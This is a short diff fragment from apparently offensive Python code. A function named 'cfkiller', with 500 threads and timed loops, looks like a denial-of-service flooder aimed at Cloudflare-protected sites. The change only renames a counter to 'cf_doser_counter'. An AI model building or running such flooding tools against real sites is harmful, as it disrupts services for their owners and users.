+ cf_doser_counter=0
  c=time.time()
  global stop
  while True:
@@ -3380,4 +3433,4 @@ def cfkiller(u,threads=500,maxtime=5,interval=300,logs=True,returning=False,wait
     stop=True
     break
  if returning==True:
-    return counter
+    return cf_doser_counter
